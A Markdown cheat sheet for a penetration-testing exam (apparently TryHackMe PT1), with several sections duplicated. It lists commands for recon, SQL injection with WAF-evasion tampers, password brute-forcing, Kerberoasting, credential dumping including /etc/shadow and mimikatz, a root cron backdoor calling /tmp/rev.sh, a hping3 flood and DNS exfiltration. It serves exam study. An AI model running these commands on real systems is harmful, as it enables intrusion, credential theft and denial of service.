  - **Subnetting**: Know how to calculate IP ranges (e.g., 192.168.1.0/24)
  - **Subdimain Enum** `dnsenum domain.com`
`massdns -r resolvers.txt -t A domain.com`
`fierce --domain domain.com`

## Web Application Testing

- **OWASP Top 10**: SQLi, XSS, IDOR, SSRF, File Upload, etc.
- **Tools**: `sqlmap`, `dalfox`, `xsstrike`, `ffuf`, `gobuster`, `nikto`, `wpscan`, `burpsuite`
- **File Upload Bypass**: Try `.php`, `.php.jpg`, `.phtml`, change Content-Type in Burp
- **Bypass Client-Side Controls**: Disable JavaScript, intercept/modify requests in Burp
- **Manual Testing**: Try all HTTP methods, test for parameter pollution, hidden fields

### Example Commands:
```bash
# Directory Brute-Forcing
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://domain.com/FUZZ
gobuster dir -u http://domain.com -w /usr/share/wordlists/dirb/common.txt
# SQL Injection
sqlmap -u "http://domain.com/page?id=1" --dbs
# XSS Testing
dalfox url http://domain.com
xsstrike -u http://domain.com
# Vulnerability Scanning
nikto -h http://domain.com
wpscan --url http://domain.com --enumerate u,p
```


### Common HTTP Status Codes

| Code | Meaning                  | Description |
|------|--------------------------|-------------|
| 200  | OK                       | The request was completed successfully. |
| 201  | Created                  | A resource has been created (e.g., a new user or blog post). |
| 301  | Moved Permanently        | Redirects the client to a new webpage or tells search engines the page has moved. |
| 302  | Found                    | Temporary redirect; the resource may change again soon. |
| 400  | Bad Request              | The request was malformed or missing parameters. |
| 401  | Not Authorised           | Authentication required to view this resource. |
| 403  | Forbidden                | You do not have permission to view this resource. |
| 404  | Page Not Found           | The requested page/resource does not exist. |
| 405  | Method Not Allowed       | The resource does not allow this HTTP method. |
| 500  | Internal Service Error   | The server encountered an error it can't handle. |
| 503  | Service Unavailable      | The server is overloaded or down for maintenance. |


## Network Penetration Testing

- **Service Enumeration**:
  - **SMB**: `enum4linux -a domain`, `smbclient -L //domain/`
  - **FTP**: `hydra -l user -P wordlist ftp://domain`
  - **SNMP**: `snmpwalk -v2c -c public domain`
  - **RDP**: `xfreerdp /u:user /p:pass /v:domain`
- **Password Attacks**: `hydra`, `medusa`, `crackmapexec`
```bash
hydra -l user -P /usr/share/wordlists/rockyou.txt ssh://domain
medusa -u user -P /usr/share/wordlists/rockyou.txt -h domain -M ssh
crackmapexec smb domain -u user -p /usr/share/wordlists/rockyou.txt
```

- **Traffic Sniffing**: `tcpdump -i eth0 -w capture.pcap`, `wireshark`, `mitmproxy`
```bash
tcpdump -i eth0 -w capture.pcap
wireshark
mitmproxy -m transparent
```

## Active Directory Exploitation

- **BloodHound**: `neo4j console & bloodhound &`, `SharpHound.exe -c all`
- **Kerberoasting**: `GetUserSPNs.py domain/user:pass -dc-ip x.x.x.x`
- **AS-REP Roasting**: `GetNPUsers.py domain/ -usersfile users.txt -no-pass`
- **Windows Enumeration**: `net user /domain`, `net group "Domain Admins" /domain`, `whoami`, `dsquery`
- **Lateral Movement**: `PsExec`, `wmiexec.py`, RDP basics

## Exploitation & Post-Exploitation

- **Privilege Escalation**:
  - **Linux**: `linpeas.sh`, check SUID, cron jobs, kernel exploits
  - **Windows**: `winPEAS.exe`, `mimikatz`, `secretsdump.py`, check services, registry
- **Persistence**:
  - **Linux**: Add cron job, SSH key, backdoor binary
  - **Windows**: Registry run keys, startup folder, scheduled tasks
- **Credential Dumping**:
  - `mimikatz`, `secretsdump.py`, `samdump2`, `/etc/shadow`, `lsass` dump
- **Host Recon**:
  - `whoami`, `hostname`, `ipconfig /all`, `ifconfig`, `ps aux`, `tasklist`, `netstat -ano`

## Reporting & Exam Strategy

- **Note-Taking**: Use Markdown, CherryTree, Obsidian, or text files. Take screenshots (`gnome-screenshot`, `scrot`).
- **Reporting**: Prepare a template with:
  - Vulnerability title
  - Impact/description
  - Steps to reproduce
  - Evidence (screenshots, output)
  - Mitigation
- **Time Management**:
  - Triage: Identify high-value domains first
  - Timebox: Don't get stuck—move on and return later
  - Document as you go

## Quick Reference Table

| Tool         | Purpose                        | Example Command                        |
|--------------|-------------------------------|----------------------------------------|
| nmap         | Port scanning                 | nmap -sC -sV -A -T4 domain            |
| gobuster     | Directory brute-forcing       | gobuster dir -u URL -w wordlist       |
| hydra        | Password brute-forcing        | hydra -l user -P passlist ssh://host  |
| enum4linux   | SMB enumeration               | enum4linux -a domain                  |
| bloodhound   | AD enumeration                | SharpHound.exe -c all                 |
| sqlmap       | SQL injection                 | sqlmap -u URL --dbs                   |
| linpeas      | Linux privesc                 | ./linpeas.sh > out.txt                |
| winPEAS      | Windows privesc               | winPEAS.exe > out.txt                 |
| mimikatz     | Credential dumping (Windows)  | mimikatz                              |
| tcpdump      | Packet capture                | tcpdump -i eth0 -w out.pcap           |

## Exam Day Checklist

- [ ] Enumerate all hosts and services (nmap, rustscan)
- [ ] Perform passive recon (whois, theHarvester, crt.sh)
- [ ] Enumerate DNS, subdomains, and try zone transfer
- [ ] Web: Test for OWASP Top 10, file upload, bypasses
- [ ] Network: Enumerate SMB, FTP, SNMP, RDP, SSH
- [ ] Attempt password attacks where applicable
- [ ] AD: Run BloodHound, try kerberoasting, AS-REP roasting
- [ ] After initial access: enumerate for privilege escalation
- [ ] Dump credentials, look for persistence opportunities
- [ ] Take notes/screenshots for every step
- [ ] Prepare clear, concise report with evidence
- [ ] Manage time—move on if stuck, revisit later

---

## 9. Linux & Windows Command Reference

### Linux
```bash
shred -u file.txt
find / -name "config*" 2>/dev/null
id
sudo -l
cat /etc/passwd
cat /etc/shadow
find / -perm -4000 2>/dev/null
uname -a
ps aux
crontab -l
```

### Useful Grep Commands
```bash
# Find files containing specific text
grep -r "password" /var/www/html/
grep -r "api_key" /var/www/html/
grep -r "secret" /var/www/html/

# Find files containing specific patterns
grep -r "admin" /var/www/html/
grep -r "root" /var/www/html/
grep -r "user" /var/www/html/

# Find files with specific extensions
find /var/www/html/ -type f -name "*.php" -exec grep -l "password" {} \;
find /var/www/html/ -type f -name "*.conf" -exec grep -l "password" {} \;

# Find files containing specific patterns (case insensitive)
grep -ri "password" /var/www/html/
grep -ri "admin" /var/www/html/

# Find files containing specific patterns with context
grep -r -A 2 -B 2 "password" /var/www/html/

# Find files containing specific patterns in specific file types
grep -r --include="*.php" "password" /var/www/html/
grep -r --include="*.conf" "password" /var/www/html/

# Find files containing specific patterns and show line numbers
grep -rn "password" /var/www/html/

# Find files containing multiple patterns
grep -r -e "password" -e "secret" /var/www/html/

# Find files containing specific patterns in compressed files
zgrep -r "password" /var/log/

# Find files containing specific patterns in binary files
grep -a "password" /path/to/binary

# Find files containing specific patterns and exclude certain directories
grep -r --exclude-dir={node_modules,git} "password" /var/www/html/
```

### Windows
```bash
whoami
hostname
ipconfig /all
net user /domain
net group "Domain Admins" /domain
```

---

## 10. Resources & Fun Stuff

### Resources
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [Kali Linux Tools Listing](https://www.kali.org/tools/)
- [SecLists GitHub](https://github.com/danielmiessler/SecLists) for wordlists
- [CrackStation](https://crackstation.net/) for online hash lookup and password cracking dictionaries
- [CyberChef](https://gchq.github.io/CyberChef/) for encryption, encoding, compression, and data analysis
- [Cryptii](https://cryptii.com/) for modular text transformation and encoding/decoding
- [LinPEAS GitHub](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) for privilege escalation

### Fun Stuff
```bash
steghide
ping -s 1300 -f domain.com
hping3 -S -V --flood domain.com
hping3 --traceroute -V -1 domain.com
cat /dev/urandom
alias ls="cat /dev/urandom"
curl wttr.in
```

---

**Note**: Replace `domain.com` with the domain domain and ensure you have authorization. Some commands require root privileges or specific tools installed. Save outputs to files (e.g., `nmap -oN output.txt`) for easier analysis.

# Banner Grabbing
nc -nv domain.com 80
telnet domain.com 80

# DNS Zone Transfer
dig axfr @ns1.domain.com domain.com

# Subnetting Example
# IP: 192.168.1.0/24 => Range: 192.168.1.1 - 192.168.1.254

# File Upload Bypass
# Try uploading .php, .php.jpg, .phtml, or use Burp to change Content-Type

# Disable JavaScript in browser dev tools to bypass client-side validation

# SMB Enumeration
enum4linux -a domain.com
smbclient -L //domain.com/

# FTP Brute Force
hydra -l user -P /usr/share/wordlists/rockyou.txt ftp://domain.com

# SNMP Enumeration
snmpwalk -v2c -c public domain.com

# Packet Capture
tcpdump -i eth0 -w capture.pcap

# BloodHound Collection
neo4j console & bloodhound &  # Start services
SharpHound.exe -c all         # Collect data on Windows

# Kerberoasting
GetUserSPNs.py domain/user:pass -dc-ip x.x.x.x

# AS-REP Roasting
GetNPUsers.py domain/ -usersfile users.txt -no-pass

# Windows Enumeration
net user /domain
net group \"Domain Admins\" /domain

# Windows Credential Dumping
mimikatz
secretsdump.py -just-dc-user domain/user:pass@dc-ip

# Linux Persistence
echo \"* * * * * root /tmp/rev.sh\" >> /etc/crontab

# Post-Exploitation Recon
whoami
hostname
ipconfig /all

---

# PT1 Exam Cheatsheet & Checklist

This section is a quick-access guide for the TryHackMe Junior Penetration Tester (PT1) exam. Use it to review key tools, commands, and strategies for each exam domain. Good luck!

## Reconnaissance & Enumeration

- **Passive Recon**: 
  - `theHarvester`, `whois`, `crt.sh`, `Shodan`, `Censys`
- **Active Recon**:
  - `nmap -sC -sV -A -T4 domain`  # Service/version detection, OS detection
  - `rustscan -a domain -- -sV -O`  # Fast port scan
  - `dig domain.com`, `nslookup domain.com`, `host domain.com`
  - **Banner Grabbing**: `nc -nv domain.com 80`, `telnet domain.com 80`
  - **DNS Zone Transfer**: `dig axfr @ns1.domain.com domain.com`
  - **Subnetting**: Know how to calculate IP ranges (e.g., 192.168.1.0/24)

## Web Application Testing

- **OWASP Top 10**: SQLi, XSS, IDOR, SSRF, File Upload, etc.
- **Tools**: `sqlmap`, `dalfox`, `xsstrike`, `ffuf`, `gobuster`, `nikto`, `wpscan`, `burpsuite`
- **File Upload Bypass**: Try `.php`, `.php.jpg`, `.phtml`, change Content-Type in Burp
- **Bypass Client-Side Controls**: Disable JavaScript, intercept/modify requests in Burp
- **Manual Testing**: Try all HTTP methods, test for parameter pollution, hidden fields

### Common HTTP Status Codes

| Code | Meaning                  | Description |
|------|--------------------------|-------------|
| 200  | OK                       | The request was completed successfully. |
| 201  | Created                  | A resource has been created (e.g., a new user or blog post). |
| 301  | Moved Permanently        | Redirects the client to a new webpage or tells search engines the page has moved. |
| 302  | Found                    | Temporary redirect; the resource may change again soon. |
| 400  | Bad Request              | The request was malformed or missing parameters. |
| 401  | Not Authorised           | Authentication required to view this resource. |
| 403  | Forbidden                | You do not have permission to view this resource. |
| 404  | Page Not Found           | The requested page/resource does not exist. |
| 405  | Method Not Allowed       | The resource does not allow this HTTP method. |
| 500  | Internal Service Error   | The server encountered an error it can't handle. |
| 503  | Service Unavailable      | The server is overloaded or down for maintenance. |

# ... existing code ...

## Network Penetration Testing

- **Service Enumeration**:
  - **SMB**: `enum4linux -a domain`, `smbclient -L //domain/`
  - **FTP**: `hydra -l user -P wordlist ftp://domain`
  - **SNMP**: `snmpwalk -v2c -c public domain`
  - **RDP**: `xfreerdp /u:user /p:pass /v:domain`
- **Password Attacks**: `hydra`, `medusa`, `crackmapexec`
- **Traffic Sniffing**: `tcpdump -i eth0 -w capture.pcap`, `wireshark`, `mitmproxy`

## Active Directory Exploitation

- **BloodHound**: `neo4j console & bloodhound &`, `SharpHound.exe -c all`
- **Kerberoasting**: `GetUserSPNs.py domain/user:pass -dc-ip x.x.x.x`
- **AS-REP Roasting**: `GetNPUsers.py domain/ -usersfile users.txt -no-pass`
- **Windows Enumeration**: `net user /domain`, `net group "Domain Admins" /domain`, `whoami`, `dsquery`
- **Lateral Movement**: `PsExec`, `wmiexec.py`, RDP basics

## Exploitation & Post-Exploitation

- **Privilege Escalation**:
  - **Linux**: `linpeas.sh`, check SUID, cron jobs, kernel exploits
  - **Windows**: `winPEAS.exe`, `mimikatz`, `secretsdump.py`, check services, registry
- **Persistence**:
  - **Linux**: Add cron job, SSH key, backdoor binary
  - **Windows**: Registry run keys, startup folder, scheduled tasks
- **Credential Dumping**:
  - `mimikatz`, `secretsdump.py`, `samdump2`, `/etc/shadow`, `lsass` dump
- **Host Recon**:
  - `whoami`, `hostname`, `ipconfig /all`, `ifconfig`, `ps aux`, `tasklist`, `netstat -ano`

## Reporting & Exam Strategy

- **Note-Taking**: Use Markdown, CherryTree, Obsidian, or text files. Take screenshots (`gnome-screenshot`, `scrot`).
- **Reporting**: Prepare a template with:
  - Vulnerability title
  - Impact/description
  - Steps to reproduce
  - Evidence (screenshots, output)
  - Mitigation
- **Time Management**:
  - Triage: Identify high-value domains first
  - Timebox: Don't get stuck—move on and return later
  - Document as you go

## Quick Reference Table

| Tool         | Purpose                        | Example Command                        |
|--------------|-------------------------------|----------------------------------------|
| nmap         | Port scanning                 | nmap -sC -sV -A -T4 domain            |
| gobuster     | Directory brute-forcing       | gobuster dir -u URL -w wordlist       |
| hydra        | Password brute-forcing        | hydra -l user -P passlist ssh://host  |
| enum4linux   | SMB enumeration               | enum4linux -a domain                  |
| bloodhound   | AD enumeration                | SharpHound.exe -c all                 |
| sqlmap       | SQL injection                 | sqlmap -u URL --dbs                   |
| linpeas      | Linux privesc                 | ./linpeas.sh > out.txt                |
| winPEAS      | Windows privesc               | winPEAS.exe > out.txt                 |
| mimikatz     | Credential dumping (Windows)  | mimikatz                              |
| tcpdump      | Packet capture                | tcpdump -i eth0 -w out.pcap           |

## Exam Day Checklist

- [ ] Enumerate all hosts and services (nmap, rustscan)
- [ ] Perform passive recon (whois, theHarvester, crt.sh)
- [ ] Enumerate DNS, subdomains, and try zone transfer
- [ ] Web: Test for OWASP Top 10, file upload, bypasses
- [ ] Network: Enumerate SMB, FTP, SNMP, RDP, SSH
- [ ] Attempt password attacks where applicable
- [ ] AD: Run BloodHound, try kerberoasting, AS-REP roasting
- [ ] After initial access: enumerate for privilege escalation
- [ ] Dump credentials, look for persistence opportunities
- [ ] Take notes/screenshots for every step
- [ ] Prepare clear, concise report with evidence
- [ ] Manage time—move on if stuck, revisit later

---

# SQL Injection with sqlmap
sqlmap -u "http://domain.com/page?id=1" --dbs

## SQLMap Comprehensive Guide

### 𝗕𝗔𝗦𝗜𝗖 𝗨𝗦𝗔𝗚𝗘
```bash
sqlmap -u "http://domain.com/page.php?id=1" --batch
```

### 𝗘𝗡𝗨𝗠𝗘𝗥𝗔𝗧𝗘 𝗗𝗔𝗧𝗔𝗕𝗔𝗦𝗘𝗦
```bash
sqlmap -u "http://domain.com/page.php?id=1" --dbs
```

### 𝗘𝗡𝗨𝗠𝗘𝗥𝗔𝗧𝗘 𝗧𝗔𝗕𝗟𝗘𝗦
```bash
sqlmap -u "http://domain.com/page.php?id=1" -D database_name --tables
```

### 𝗘𝗡𝗨𝗠𝗘𝗥𝗔𝗧𝗘 𝗖𝗢𝗟𝗨𝗠𝗡𝗦
```bash
sqlmap -u "http://domain.com/page.php?id=1" -D database_name -T table_name --columns
```

### 𝗗𝗨𝗠𝗣 𝗧𝗔𝗕𝗟𝗘 𝗗𝗔𝗧𝗔
```bash
sqlmap -u "http://domain.com/page.php?id=1" -D database_name -T table_name --dump
```

### 𝗕𝗬𝗣𝗔𝗦𝗦 𝗪𝗔𝗙 / 𝗙𝗜𝗟𝗧𝗘𝗥𝗦
```bash
sqlmap -u "http://domain.com/page.php?id=1" --tamper=between,charencode,randomcase,space2comment,versionedmorekeywords
```
Use multiple tamper scripts to evade security filters and bypass WAFs. You can chain them together.

### 𝗢𝗕𝗙𝗨𝗦𝗖𝗔𝗧𝗘 𝗣𝗔𝗬𝗟𝗢𝗔𝗗𝗦
```bash
sqlmap -u "http://domain.com/page.php?id=1" --prefix="%00" --suffix="--+" --tamper=space2comment
```

### 𝗖𝗨𝗦𝗧𝗢𝗠 𝗥𝗘𝗫𝗨𝗘𝗦𝗧 + 𝗕𝗨𝗥𝗣
```bash
sqlmap -r request.txt --batch --random-agent --level=5 --risk=3 --tamper=charencode,randomcase
```

### 𝗖𝗨𝗦𝗧𝗢𝗠 𝗛𝗘𝗔𝗗𝗘𝗥𝗦 + 𝗖𝗢𝗢𝗞𝗜𝗘𝗦
```bash
sqlmap -u "http://domain.com/page.php?id=1" --cookie="PHPSESSID=abc123" --headers="X-Forwarded-For: 127.0.0.1"
```

### 𝗧𝗜𝗠𝗘-𝗕𝗔𝗦𝗘𝗗 𝗕𝗟𝗜𝗡𝗗 𝗜𝗡𝗝𝗘𝗖𝗧𝗜𝗢𝗡
```bash
sqlmap -u "http://domain.com/page.php?id=1" --technique=T --time-sec=10 --tamper=space2comment
```

### 𝗗𝗘𝗘𝗣 𝗦𝗖𝗔𝗡 + 𝗠𝗔𝗫 𝗢𝗕𝗙𝗨𝗦𝗖𝗔𝗧𝗜𝗢𝗡
```bash
sqlmap -u "http://domain.com/page.php?id=1" --tamper=between,charencode,randomcase,space2comment,apostrophemask --level=5 --risk=3 --threads=5 --batch
```

### 𝗨𝗦𝗘 𝗧𝗢𝗥 𝗙𝗢𝗥 𝗔𝗡𝗢𝗡𝗬𝗠𝗜𝗧𝗬
```bash
sqlmap -u "http://domain.com/page.php?id=1" --tor --tor-type=SOCKS5 --check-tor
```

### 𝗗𝗡𝗦 𝗘𝗫𝗙𝗜𝗟𝗧𝗥𝗔𝗧𝗜𝗢𝗡
```bash
sqlmap -u "http://domain.com/page.php?id=1" --dns-domain=http://yourdomain.com
```
Use this in blind SQLi when you control the DNS server.

---
